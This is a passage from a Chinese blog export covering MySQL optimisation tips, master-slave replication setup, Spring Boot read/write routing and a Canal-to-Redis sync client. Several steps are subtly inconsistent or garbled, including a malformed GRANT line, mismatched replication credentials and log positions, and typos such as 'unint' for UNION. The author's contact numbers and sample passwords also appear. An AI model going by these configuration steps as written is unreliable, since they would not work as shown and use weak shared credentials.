连接池。 注：SpringBoot 2.0 以后默认连接池是 hikariCP。 # 3. 分库分表 在数据量增长和增长速度越来越高的情况下，单库可能在容量、IO、并发性能上都无法支撑，这个时候就要对业务进行切分或数据库进行扩展，数据库的扩展也就是分库分表。 分库分表的方式有垂直拆分和水平拆分。 垂直拆分是根据业务进行拆分，这种拆分不能解决单业务点数据量大的问题。 水平拆分是根据某一列进行拆分（如 id，userId），拆分后的每个库结构一致。 # 4. 主从同步 一般部署架构为一台 Master 和 n 台 Slave，Master 的主责为写，并将数据同步至 Slave，Slave 主要提供查询功能。 可以使用数据库中间件，例如 MyCat 来实现。MyCat 的读写分离是建立在 MySQL 主从复制基础之上实现的，Mycat 读写分离和自动切换机制，需要 mysql 的主从复制机制配合。 # 二、表优化 # 1. 表中的字段选择合适的数据类型 能用数字类型，就不用字符串，因为字符的处理往往比数字要慢。 尽可能使用小的类型，比如：用 bit 存布尔值，用 tinyint 存枚举值等。 长度固定的字符串字段，用 char 类型，该类型的字段存储空间的固定的。 长度可变的字符串字段，用 varchar 类型，该类型的字段存储空间会根据实际数据的长度调整，不会浪费存储空间。 金额字段用 decimal，避免精度丢失问题。 1、当一个列可以选择多种数据类型时，应该优先考虑数字类型，其次是日期和二进制类型，最后是字符类型。 2、对于相同级别的数据类型，应该优先选择占用空间小的数据类型。 # 2. 适当添加索引 MySQL 里同一个数据表里的索引总数限制为 16 个。 索引尽量的扩展索引，不要新建索引。 在表中建立索引，优先考虑 where、order by 使用到的字段。 阿里巴巴的开发者手册中规定，单表的索引数量应该尽量控制在 5 个以内，并且单个索引中的字段数不超过 5 个。 # 3. 表中适当保留冗余数据 没有冗余的数据库未必是最好的数据库，有时为了提高运行效率，提高读性能，就必须降低范式标准，适当保留冗余数据。 虽然三大范式是为了解决数据库冗余的问题，但是阿里开发手册中提到可以适当的违反范式，允许少量的冗余，以便提高查询效率，也就是使用空间换时间。 具体做法是： 在概念数据模型设计时遵守第三范式，降低范式标准的工作放到物理数据模型设计时考虑。降低范式就是增加字段，减少了查询时的关联，提高查询效率。 # 4. 增加中间表 对于需要经常联合查询的表，可以建立中间表以提高查询效率。通过建立中间表，把需要经常联合查询的数据插入到中间表中，然后将原来的联合查询改为对中间表的查询，以此来提高查询效率。 # 5. 字段很多的表分解成多个表 对于字段比较多的表，如果有些字段的使用频率很低，可以将这些字段分离出来形成新表。因为当一个表的数据量很大时，会由于使用频率低的字段的存在而变慢。 # 6. 添加适当存储过程 一个存储过程是一个可编程的函数，它在数据库中创建并保存，一般由 SQL 语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的特定功能时，存储过程尤为合适。 存储过程与 SQL 语句如何抉择： 架构设计没有绝对，只有在当前的场景下最合适的。 普通的项目开发中，不建议大量使用存储过程，对比 SQL 语句，存储过程适用于业务逻辑复杂，比较耗时，同时请求量较少的操作，例如后台大批量查询、定期更新等。 （1）当一个事务涉及到多个 SQL 语句时或者涉及到对多个表的操作时可以考虑应用存储过程 （2）在一个事务的完成需要很复杂的商业逻辑时可以考虑应用存储过程 （3）比较复杂的统计和汇总可以考虑应用后台存储过程 # 三、SQL 语句优化 # 1. 尽量使用表的别名，减少解析 当在 SQL 语句中连接多个表时，使用表的别名并把别名前缀于每个 Column 上，这样一来，就可以减少解析的时间并减少那些由 Column 歧义引起的语法错误。 # 2.select 子句中避免使用 * 号 使用具体的列名，可以有效增加查询速度。 避免回表查询。 比如你创建了 name， age 索引 name_age_index，查询数据时使用了： select * from table where name =‘陈哈哈’ and age = 26; 由于附加索引中只有 name 和 age，因此命中索引后，数据库还必须回去聚集索引中查找其他数据，这就是回表。 失去 MySQL 优化器 “覆盖索引” 策略优化的可能性。 # 3. 将 where 中用的比较频繁的字段建立索引，避免全表扫描 1. 普通索引：这是最基本的索引类型，而且它没有唯一性之类的限制。 2. 唯一索引：和普通索引基本相同，只是索引列的所有值都只能出现一次，即必须唯一。 3. 主键索引：就是 唯一 且 不能为空。主键索引是一种特殊的唯一索引。必须指定为 “PRIMARY KEY”。 4. 联合索引：多列值组成一个索引，专门用于组合搜索。 5. 全文索引：用于在一篇文章中，检索文本信息的，适合在进行模糊查询的时候使用。 提示点： 唯一索引和普通索引使用的结构都是 B+Tree, 执行时间复杂度都是 O。 如果在一个列上同时建唯一索引和普通索引的话，mysql 会自动选择唯一索引。 MySQL 建立联合索引时会遵守最左前缀匹配原则，即最左优先，在检索数据时从联合索引的最左边开始匹配。同时遇到范围查询 (&gt;、&lt;、between、like) 就会停止匹配。 索引区分度低的字段不要加索引，比如性别，如果添加了索引每次查询会先走索引树，再回表查询，增加了额外的 io 消耗。 # 4. 避免索引失效情况 索引失效情况 1、like 查询以 “%” 开头；(这个范围非常大，所以没有使用索引的必要了) 2、or 查询左右都没有使用索引；(or 可以使用 unint) 3、联合索引中没有使用第一列索引；(为遵循最左匹配原则) 4、在 where 中索引列上使用 “not”，“&lt;&gt;”，“!=”；(不等于操作符可能不会用到索引的，产生全表扫描) 5、在 where 中索引列上使用函数或进行计算操作，索引失效。(更改字段导致失效) 6、如果 mysql 觉得全表扫描更快时（数据少时） 7、在索引列上使用 “IS NULL” 或 “IS NOT NULL” 操作，索引可能失效（如果列上全部数据不为空，索引会失效，但是如果有空值，索引不会失效） … # 5. 当只需要一条数据的时候可以使用 limit 1 这是为了使 EXPLAIN 中 type 列达到 const 类型 # 6. 调整 Where 字句中的连接顺序 采用自下而上的顺序解析 where 字句，根据这个原理表连接最好写在其他 where 条件之前，那些可以过滤掉最大数量记录。 # 7. 小表驱动大表 SQL 中使用 in： 如果 sql 语句中包含了 in 关键字，则它会优先执行 in 里面的子查询语句，然后再执行 in 外面的语句。所以假如 in 里面的数据量很少，作为条件查询速度更快。 SQL 中使用 exists： 如果 sql 语句中包含了 exists 关键字，它会优先执行 exists 左边的语句（即主查询语句）。然后把它作为条件，去跟右边的语句匹配。 如果匹配上，则可以查询出数据。如果匹配不上，数据就被过滤掉了。 这个需求中，如果 order 表有 10000 条数据，而 user 表有 100 条数据。order 表是大表，user 表是小表。如果 order 表在左边，则用 in 关键字性能更好。 总结一下： in 适用于左边大表，右边小表。 exists 适用于左边小表，右边大表。 # 8. 善用 EXPLAIN 查看 SQL 执行计划 1EXPLAIN select column_name from table_name; type 列，访问类型。一个好的 sql 语句至少要达到 range (范围) 级别。杜绝出现 all 级别。 ALL、index、range、 ref、eq_ref、const、system、NULL（从左到右，性能从差到好） key 列，使用到的索引名。如果没有选择索引，值是 NULL。可以采取强制索引方式。 key_len 列，索引长度。 rows 列，扫描行数。该值是个预估值 。 extra 列，详细说明。注意常见的不太友好的值有：Using filesort, Using temporary。 具体的优化步骤： 1、首先要避免全表扫描，检查是否有索引。 2、查看索引是否生效。 3、sql 结构的优化。 4、数据库表设计的优化。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/05/13/%E3%80%90MySQL%E3%80%91MySql%E7%9B%B8%E5%85%B3%E4%BC%98%E5%8C%96%E5%88%86%E4%BA%AB/"},{"title":"Mysql主从集群搭建文档，实现读写分离","text":"# Mysql 主从集群搭建文档，实现读写分离 ​ 最近在自己写的项目中需要应对大量的用户查询读写操作，一台服务器当然是不够的，所以在边学边敲的背景下，记录这篇笔记，从 0 开始搭建主从集群。 # 下面👇开始操作： 1. 分别在两台服务器搭建 mysql 服务 ​ 两台服务器的 IP 地址分别为主服务器（192.168.20.1）和从服务器（192.168.20.2）。 2. 配置文件 my.cnf 的修改 1234567891011121314#根据上一篇文章，编辑my.cnf文件[root@localhost mysql]# vim /etc/my.cnf #在[mysqld]中添加：server-id=1log_bin=master-binlog_bin_index=master-bin.indexbinlog_do_db=test#备注：#server-id 服务器唯一标识。#log_bin 启动MySQL二进制日志，即数据同步语句，从数据库会一条一条的执行这些语句。#binlog_do_db 指定记录二进制日志的数据库，即需要复制的数据库名，如果复制多个数据库，重复设置这个选项即可。#binlog_ignore_db 指定不记录二进制日志的数据库，即不需要复制的数据库名，如果有多个数据库，重复设置这个选项即可。#其中需要注意的是，binlog_do_db和binlog_ignore_db为互斥选项，一般只需要一个即可。 3. 创建从服务器的用户和权限 1234567891011121314#进入mysql数据库[root@localhost mysql]# mysql -uroot -pEnter password:#创建从数据库的root用户和权限mysql&gt; grant replication slave on *.* to root@'192.168.20.%' identified by 'Lgq081538';grant replication slave on *.* to '123456'#备注#192.168.20.%通配符，表示0-255的IP都可访问主服务器，正式环境请配置指定从服务器IP#若将 192.168.20.% 改为 %，则任何ip均可作为其从数据库来访问主服务器#退出mysqlmysql&gt; exit; 4. 重启 mysql 服务 123[root@localhost mysql]# service mysql restartShutting down MySQL.... SUCCESS! Starting MySQL. SUCCESS! 5. 查看主服务器状态 123456789101112#进入mysql数据库[root@localhost mysql]# mysql -uroot -pEnter password:#查看主服务器状态mysql&gt; show master status;+-------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------+----------+--------------+------------------+-------------------+| master-bin.000001 | 154 | test | | |+-------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec) 6.slave 从服务器的配置 123456789101112131415配置文件my.cnf的修改#根据上一篇文章，编辑my.cnf文件[root@localhost mysql]# vim /etc/my.cnf#在[mysqld]中添加：server-id=2relay-log=slave-relay-binrelay-log-index=slave-relay-bin.index#replicate-do-db=test#备注：#server-id 服务器唯一标识，如果有多个从服务器，每个服务器的server-id不能重复，跟IP一样是唯一标识，如果你没设置server-id或者设置为0，则从服务器不会连接到主服务器。#relay-log 启动MySQL二进制日志，可以用来做数据备份和崩溃恢复，或主服务器挂掉了，将此从服务器作为其他从服务器的主服务器。#replicate-do-db 指定同步的数据库，如果复制多个数据库，重复设置这个选项即可。若在master端不指定binlog-do-db，则在slave端可用replication-do-db来过滤。#replicate-ignore-db 不需要同步的数据库，如果有多个数据库，重复设置这个选项即可。#其中需要注意的是，replicate-do-db和replicate-ignore-db为互斥选项，一般只需要一个即可。 7. 重启 mysql 服务 123[root@localhost mysql]# service mysql restartShutting down MySQL.... SUCCESS! Starting MySQL. SUCCESS! 8. 连接 master 主服务器 123456789101112#进入mysql数据库[root@localhost mysql]# mysql -uroot -pEnter password:#连接master主服务器mysql&gt; change master to master_host='192.168.20.1',master_port=3306,master_user='root',master_password='123456',master_log_file='master-bin.000009',master_log_pos=473127;#备注：#master_host对应主服务器的IP地址。#master_port对应主服务器的端口。#master_log_file对应show master status显示的File列：master-bin.000001。#master_log_pos对应show master status显示的Position列：154。 9. 启动 slave 数据同步 1234567#启动slave数据同步mysql&gt; start slave;#停止slave数据同步（若有需要）mysql&gt; stop slave;3.5 查看slave信息mysql&gt; show slave status\\G;Slave_IO_Running和Slave_SQL_Running都为yes，则表示同步成功。 10. 测试 12345678910（1）在主服务器上登陆mysql，且进入test数据库，创建test表，且插入一条数据提示：这里最好用数据库管理工具（如nacicat）来操作。#创建tb_test表create table tb_test(ID varchar(36) primary key comment '主键ID',MEMO varchar(500) not null comment '信息');#插入一条数据insert into tb_test(ID,MEMO) values('1','one test');#提交commit;（2）在从服务器上登陆mysql，且进入test数据库你会发现从数据库中，也出现了tb_test表，且表中还有one test数据存在，证明同步数据成功。 # 至此 Mysql 主从读写分离搭建完成 下面开始搭建 Spring Boot 项目中的相关配置以及实现👇 ​ 读写分离要做的事情就是对于一条 SQL 该选择哪个数据库去执行，至于谁来做选择数据库这件事，主要有两种实现方式，分别为： 1. 使用中间件，比如 Atlas，cobar，TDDL，mycat，heisenberg，Oceanus，vitess，OneProxy 等 2. 使用程序自己实现，利用 Spring Boot 提供的路由数据源以及 AOP，实现起来简单快捷 ​ ​ 我们使用第二种方式 Spring Boot 数据源路由 + AOP ，这样能更好的控制流程，也便于后期提升性能； 代码实现 1. 首先配置下 pom.xml 因为我们使用 aop 实现，所以需要 aop 依赖 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-aop&lt;/artifactId&gt;&lt;/dependency&gt; 2. 数据源路由类功能 RoutingDataSource.java 1234567891011121314151617import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 数据源路由类功能 */public class RoutingDataSource extends AbstractRoutingDataSource { @Override protected Object determineCurrentLookupKey() { return DBContext.get(); }} 3. 数据源上下文类 DBContext.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344import lombok.extern.slf4j.Slf4j;import java.util.concurrent.atomic.AtomicInteger;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 数据源上下文类 */@Slf4jpublic class DBContext { private static final ThreadLocal&lt;DBTypeEnum&gt; dbContext = new ThreadLocal&lt;&gt;(); private static final AtomicInteger counter = new AtomicInteger(-1); public static void set(DBTypeEnum dbType) { dbContext.set(dbType); } public static DBTypeEnum get() { return dbContext.get(); } public static void master() { set(DBTypeEnum.MASTER); log.info(&quot;切换到master库&quot;); } public static void slave() { // 读库负载均衡(轮询方式) int index = counter.getAndIncrement() % 2; log.info(&quot;slave库访问线程数==&gt;{}&quot;, counter.get()); if (index == 0) { set(DBTypeEnum.SLAVE1); log.info(&quot;切换到slave1库&quot;); } else { set(DBTypeEnum.SLAVE2); log.info(&quot;切换到slave2库&quot;); } }} 4. 数据库枚举类 DBTypeEnum.java 1234567891011121314151617package com.example.demo.databases;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 数据库枚举类 */public enum DBTypeEnum { MASTER, //主库 SLAVE1, //从库1 SLAVE2 //从库2} 这里我们配置三个库，分别是一个写库 Master，2 个读库 slave1,slave2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.boot.jdbc.DataSourceBuilder;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import javax.sql.DataSource;import java.util.HashMap;import java.util.Map;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 数据库配置类 */@Configurationpublic class DataSourceConfigs { @Bean @ConfigurationProperties(&quot;spring.datasource.master&quot;) public DataSource masterDataSource() { return DataSourceBuilder.create().build(); } @Bean @ConfigurationProperties(&quot;spring.datasource.slave1&quot;) public DataSource slave1DataSource() { return DataSourceBuilder.create().build(); } @Bean @ConfigurationProperties(&quot;spring.datasource.slave2&quot;) public DataSource slave2DataSource() { return DataSourceBuilder.create().build(); } @Bean public DataSource myRoutingDataSource(@Qualifier(&quot;masterDataSource&quot;) DataSource masterDataSource, @Qualifier(&quot;slave1DataSource&quot;) DataSource slave1DataSource, @Qualifier(&quot;slave2DataSource&quot;) DataSource slave2DataSource) { Map&lt;Object, Object&gt; targetDataSources = new HashMap&lt;&gt;(); targetDataSources.put(DBTypeEnum.MASTER, masterDataSource); targetDataSources.put(DBTypeEnum.SLAVE1, slave1DataSource); targetDataSources.put(DBTypeEnum.SLAVE2, slave2DataSource); RoutingDataSource routingDataSource = new RoutingDataSource(); routingDataSource.setDefaultTargetDataSource(masterDataSource); routingDataSource.setTargetDataSources(targetDataSources); return routingDataSource; }} 6. 切面类 DataSourceAop.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Before;import org.aspectj.lang.annotation.Pointcut;import org.springframework.stereotype.Component;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 切面类DataSourceAop */@Aspect@Componentpublic class DataSourceAop { @Pointcut(&quot;@annotation(com.example.demo.databases.Master) &quot; + &quot;|| execution(* com.example.demo.*.service..*.insert*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.create*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.save*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.add*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.update*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.edit*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.delete*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.remove*(..))&quot;) public void writePointcut() { } @Pointcut(&quot;!@annotation(com.example.demo.databases.Master) &quot; + &quot;&amp;&amp; (execution(* com.example.demo.*.service..*.select*(..)) &quot; + &quot;|| execution(* com.example.demo.*.service..*.list*(..))&quot; + &quot;|| execution(* com.example.demo.*.service..*.count*(..))&quot; + &quot;|| execution(* com.example.demo.*.service..*.get*(..)))&quot; ) public void readPointcut() { } @Before(&quot;writePointcut()&quot;) public void write() { DBContext.master(); } @Before(&quot;readPointcut()&quot;) public void read() { DBContext.slave(); }} 7. 注解类 Master.java 1234567891011121314package com.example.demo.databases;/** * @Auther: Brath * Create By Administrator on 2022/6/24 12:05 * Strive to create higher performance code * @My wechat: 17604868415 * @My QQ: 2634490675 * @My email 1: email_ guoqing@163.com * 注解类Master 主库，可读写 */public @interface Master {} # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2020/12/20/%E3%80%90MySQL%E3%80%91Mysql%E4%B8%BB%E4%BB%8E%E9%9B%86%E7%BE%A4/"},{"title":"MySQL安装 starting the server失败的解决办法","text":"# MySQL 安装 starting the server 失败的解决办法 ​ 如果电脑是第一次安装 MySQL，一般不会出现这样的报错。如下图所示。starting the server 失败，通常是因为上次安装的该软件未清除干净。 完全卸载该软件的办法： 第一步，进入… 控制面板 \\ 程序 \\ 程序和功能，卸载下图中的 MySQL 两个软件。 第二步，删除上次安装目录的 MySQL 残留文件，更不要忘了删除 ProgramData 下的 MySQL 文件夹，如下图所示。注意：这里的文件夹与上次安装目录里的残留文件不同，C:\\ProgramData 一般默认是隐藏的。 第三步，Win+R 输入 regedit 运行，进入注册表编辑器，按下图路径，找到 MySQL，进而删除 MySQL 注册表信息。 第四步，做完前三步，打开服务，会发现 MySQL57 服务依然存在，如下图所示。这就是导致安装失败的重要原因，所以需要删除 MySQL57 服务。方法：以管理员的权限运行 dos 命令，然后输入 sc delete MySQL57 。 123C:\\Windows\\system32&gt;sc delete MySQL57[SC] DeleteService 成功12 现在就可以轻松的安装上 MySQL 软件了！ # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/03/24/%E3%80%90MySQL%E3%80%91MySQL%E5%AE%89%E8%A3%85%20starting%20the%20server%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"},{"title":"MySQL8下载与安装教程","text":"# MySQL 下载与安装（8.0.20 版）教程 MySQL 官网：链接 直接点击链接也可以下载：mysql 8.0.20 登录官网后如下图下载 MySQL 软件： 点击 1 和 2 后进入下图页面： 再点击 MySQL Community Server 进入下图下载页面： 根据上图选择好 1 处后点击 2 处进入 Windows 安装包的下载页面 (如下图): 上图中有两个下载包，一个是安装引导包，一个是压缩安装包，我们选择第二个。点击 Download 进入下图页面。 我们不登陆下载，所以直接点击红框按钮进行下载。这样我们就把软件下载下来了。 安装： 双击上面下载的软件，打开下图页面。 点击 Next, 转到下图页面。 如果大红框上面有些没有安装的软件会出现这里，可以点击 Next 左边的 Excute 按钮安装，安装完成之后点击 Next 按钮，会出现个弹框，如下图。 点击 Yes。弹出下图页面。 点击 Execute 进行安装。等待所有安装完成。 至少保证红杠处的 3 项安装成功，假若有安装失败的可以卸载重新安装。安装成功后我们点击 Next。 点击 Next。 点击 Next。 点击 Next。 在红框里输入账号和密码，账号密码必须大于或等于 4 个字符，点击 Next。 点击 Next。 点击 Excute。 点击 Finish。 点击 Next。 点击 Finish。 点击 Next。 输入密码后点击 Check, 再点击 Next。 点击 Execute。 点击 Finish。 点击 Next。 点击 Finish。 到此位置 MySQL 就安装完成了。 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/01/13/%E3%80%90MySQL%E3%80%91Mysql8%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"},{"title":"Redis与Mysql | Master与Slave同步：canal教学","text":"# 前言： ​ 作者最近在做自己的项目，使用到 Redis，需要热更新，修改 Mysql 后同步 Redis 缓存，出于对圈子的贡献，也较于当前的 canal 的博客大多数不是很详细，所以写下这篇文章，时间是 2022 年 6 月 29 日。目的是帮助更多的人，希望能为在祖国的经济发展作出小小的贡献。 ​ end # 学习 Canal 基本需要： ​ Linux 服务器，性能无大要求 ​ Java 基础 ​ Mysql，Redis 基础 # 俗话说，要了解一个东西，先了解他的由来： # 一、Canal 起源 ​ 阿里巴巴因为业务特性，买家集中在国外，衍生出了杭州美国异地数据同步需求，从 2010 年开始，阿里巴巴开始开发 canal，canal 是基于 Java 开发的数据库增量日志解析，提供增量数据订阅 &amp; 消费的中间件。Canal 主要支持了 Mysql 和 Bilog 解析，解析完成后利用 canal Client 来处理获取相关数据。 了解完 canal 的起源，再来看看 canal 的核心业务依赖，也就是 mysql 的二进制日志：binary_log 简称：Binlog # 二、Binlog ​ binlog 指二进制日志，它记录了数据库上的所有改变，并以二进制的形式保存在磁盘中，它可以用来查看数据库的变更历史、数据库增量备份和恢复、MySQL 的复制（主从数据库的复制）。 # binlog 有三种格式： statement：基于 SQL 语句的复制（statement-based replication，SBR） row：基于行的复制（row-based replication，RBR） mixed：混合模式复制（mixed-based replication，MBR） # statement：语句级别 每一条会修改数据的 sql 都会记录在 binlog 中。 ​ 优点：不需要记录每一行的变化，减少了 binlog 日志量，节约了 IO，提高性能。但是注意 statement 相比于 row 能节约多少性能与日志量，取决于应用的 SQL 情况。正常同一条记录修改或者插入 row 格式所产生的日志量还小于 Statement 产生的日志量，但是考虑到如果带条件的 update 操作，以及整表删除，alter 表等操作，ROW 格式会产生大量日志，因此在考虑是否使用 ROW 格式日志时应该跟据应用的实际情况，其所产生的日志量会增加多少，以及带来的 IO 性能问题。 ​ 缺点：由于记录的只是执行语句，为了这些语句在 slave 上正确运行，我们还必须记录每条语句在执行时候的一些相关信息，以保证所有语句能在 slave 得到和在 master 端执行时相同的结果。另外，一些特定的函数功能如果要在 slave 和 master 上保持一致会有很多相关问题。 # row：行数据级别 5.1.5 版本的 MySQL 才开始支持 row level 的复制，它不记录 sql 语句上下文相关信息，仅保存哪条记录被修改。 ​ 优点：binlog 中可以不记录执行的 sql 语句的上下文相关的信息，仅需要记录那一条记录被修改成什么了。所以 row level 的日志会非常清楚的记下每一行数据修改的细节。而且不会出现某些特定情况下的存储过程，或 function，以及 trigger 的调用和触发无法被正确复制的问题。 ​ 缺点：所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容。但是新版本的 MySQL 对 row level 模式进行了优化，并不是所有的修改都会以 row level 来记录，像遇到表结构变更的时候就会以 statement 模式来记录，如果 sql 语句确实就是 update 或者 delete 等修改数据的语句，那么还是会记录所有行的变更。 # mixed：混合级别 从 5.1.8 版本开始，MySQL 提供了 Mixed 格式，实际上就是 Statement 与 Row 的结合。 ​ 在 Mixed 模式下，一般的语句修改使用 statment 格式保存 binlog，如果一些函数，statement 无法完成主从复制的操作，则采用 row 格式保存 binlog，MySQL 会根据执行的每一条具体的 sql 语句来区分对待记录的日志形式，也就是在 Statement 和 Row 之间选择一种。 # 由于 statement 和 mixed 的特殊性，通过 sql 来备份，总会有数据不一致的情况，比如：now () 函数。 # 所以绝大多数场景下使用 Row 级别，也就是行级别，这样保证我们备份的数据和出口的数据相一致。 # 三、下载和安装 Canal 工具 下载前，在 mysql 创建 canal 用户，因为 canal 服务端需要连接 mysql 数据库 12345-- 使用命令登录：mysql -u root -p-- 创建用户 用户名：canal 密码：Canal@123456create user 'canal'@'%' identified by 'Canal@123456';-- 授权 *.*表示所有库grant SELECT, REPLICATION SLAVE, REPLICATION CLIENT on *.* to 'canal'@'%' identified by 'Canal@123456'; # 改了配置文件之后，重启 MySQL，使用命令查看是否打开 binlog 模式： # 查看 binlog 日志文件列表： # 点此下载 Canal👇 https://ghproxy.com/https://github.com/alibaba/canal/releases/download/canal-1.1.2/canal.deployer-1.1.2.tar.gz 此链接为 github 代理提供连接，仅供参考，此处无广告意义。 下载好后上传至 linux 服务器，创建 canal 文件夹并解压到 canal 文件夹中 完成后会得到以上四个核心文件：bin，conf，lib，logs 需要修改一处配置文件： ​ /canal/conf/example 下的 instance.properties 修改完成后保存退出 接下来进入 bin 目录 sh startUp.sh 启动 canal 服务端 # 至此服务端的操作基本完成 Java 客户端操作 首先引入 maven 依赖： 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.otter&lt;/groupId&gt; &lt;artifactId&gt;canal.client&lt;/artifactId&gt; &lt;version&gt;1.1.2&lt;/version&gt;&lt;/dependency&gt; 然后创建一个 canal 项目，使用 SpringBoot 构建，如图所示，创建 canal 包： canal 工具类，仅供参考 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141package cn.brath.canal;import java.awt.print.Printable;import java.time.LocalDateTime;import cn.brath.common.redis.service.TokenService;import cn.brath.common.redis.util.RedisKeys;import cn.brath.common.utils.AssertUtil;import cn.brath.common.utils.UserTokenManager;import cn.brath.entity.IvUser;import com.alibaba.fastjson.JSONObject;import com.alibaba.otter.canal.client.CanalConnector;import com.alibaba.otter.canal.client.CanalConnectors;import com.alibaba.otter.canal.protocol.CanalEntry.*;import com.alibaba.otter.canal.protocol.Message;import com.google.protobuf.InvalidProtocolBufferException;import lombok.Data;import org.apache.commons.lang3.StringUtils;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component;import javax.print.attribute.standard.MediaPrintableArea;import java.net.InetSocketAddress;import java.time.ZoneId;import java.util.List;@Component@Datapublic class CanalClient { /** * SLF4J日志 */ private static Logger logger = LoggerFactory.getLogger(CanalClient.class); private String host = &quot;***.***.***.***&quot;; private String port = &quot;11111&quot;; private String destination = &quot;example&quot;; /** * 用户令牌业务接口 */ private static TokenService tokenService; @Autowired public void TokenServiceIn(TokenService tokenService) { CanalClient.tokenService = tokenService; } /** * canal启动方法 */ public void run() { if (!AssertUtil.isEmptys(host, port, destination)) { logger.error(&quot;canal客户端连接失败，当前服务端host：{}，port：{}，destination：{}&quot;, host, port, destination); return; } CanalConnector connector = CanalConnectors.newSingleConnector( new InetSocketAddress(host, Integer.valueOf(port)), destination, &quot;&quot;, &quot;&quot; ); int batchSize = 1000; try { //建立连接 connector.connect(); //目标为全部表 connector.subscribe(&quot;.*\\\\..*&quot;); connector.rollback(); logger.info(&quot;canal客户端连接完成，当前服务端host：{}，port：{}，destination：{}&quot;, host, port, destination); try { while (true) { //尝试从master那边拉去数据batchSize条记录，有多少取多少 Message message = connector.getWithoutAck(batchSize); long batchId = message.getId(); int size = message.getEntries().size(); if (batchId == -1 || size == 0) { Thread.sleep(1000); } else { logger.info(&quot;同步任务进行中，检测到修改数据，执行同步Redis&quot;); dataHandle(message.getEntries()); } connector.ack(batchId); } } catch (InterruptedException e) { e.printStackTrace(); } catch (InvalidProtocolBufferException e) { e.printStackTrace(); } } finally { connector.disconnect(); } } /** * 数据处理 * * @param entrys */ private void dataHandle(List&lt;Entry&gt; entrys) throws InvalidProtocolBufferException { JSONObject beforeData = null; JSONObject afterData = null; for (Entry entry : entrys) { if (EntryType.ROWDATA.equals(entry.getEntryType())) { //反序列化rowdata RowChange rowChange = RowChange.parseFrom(entry.getStoreValue()); //获取数据集 List&lt;RowData&gt; rowDataList = rowChange.getRowDatasList(); //获取数据遍历 for (RowData rowData : rowDataList) { afterData = new JSONObject(); List&lt;Column&gt; afterColumnsList = rowData.getAfterColumnsList(); for (Column column : afterColumnsList) { afterData.put(column.getName(), column.getValue()); } } //因为作者这里只做同步Redis，不考虑到操作类型，只需要覆盖相同键值数据 //写入Redis executeRedisWarehousing(afterData); } } } /** * 执行Redis用户数据入库 * * @param afterData */ public static void executeRedisWarehousing(JSONObject afterData) { logger.info(&quot;开始执行Redis热更新入库同步Mysql -- &quot;); do... logger.info(&quot;入库完成&quot;); }} # 启动类使用： 123456789101112131415@SpringBootApplication@Slf4jpublic class Application { public static void main(String[] args) { SpringApplication.run(InterviewUserServiceApplication.class, args); //项目启动，执行canal客户端监听 try { new CanalClient().run(); } catch (Exception e) { e.printStackTrace(); log.error(&quot; canal客户端监听 启动失败，原因可能是：{}&quot;, e.getMessage()); } }} 接下来启动项目运行，成功连接 canal 后我们尝试修改一个 mysql 